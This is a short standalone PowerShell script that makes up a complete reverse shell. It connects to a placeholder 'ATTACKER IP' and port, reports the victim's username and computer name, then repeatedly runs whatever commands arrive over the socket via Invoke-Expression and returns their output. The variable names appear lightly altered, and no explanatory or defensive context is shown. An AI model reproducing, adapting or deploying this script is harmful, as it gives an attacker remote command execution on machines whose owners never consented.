try 
{
    $c_obj = New-Object System.Net.Sockets.TCPClient('ATTACKER IP','PORT')

    $data_s = $c_obj.GetStream()
    [byte[]]$b_obj = 0..65535|%{0}

    $sendbytes = ([text.encoding]::ASCII).GetBytes($env:username + "@" + $env:computername + "`n`n")
    $data_s.Write($sendbytes,0,$sendbytes.Length)

    while(($i = $data_s.Read($b_obj, 0, $b_obj.Length)) -ne 0)
    {
        $ET = New-Object -TypeName System.Text.ASCIIEncoding
        $data = $ET.GetString($b_obj,0, $i)
        try
        {
            $sendback = (Invoke-Expression -c $data 2>&1 | Out-String )
        }
        catch
        {
            Write-Warning "Oops!" 
        }
        $dat1  = $sendback + '> '
        $x = ($error[0] | Out-String)
        $error.clear()
        $dat1 = $dat1 + $x

        $sendbyte = ([text.encoding]::ASCII).GetBytes($dat1)
        $data_s.Write($sendbyte,0,$sendbyte.Length)
        $data_s.Flush()  
    }
    $c_obj.Close()
}
catch
{
    Write-Error "Oops!" 
}
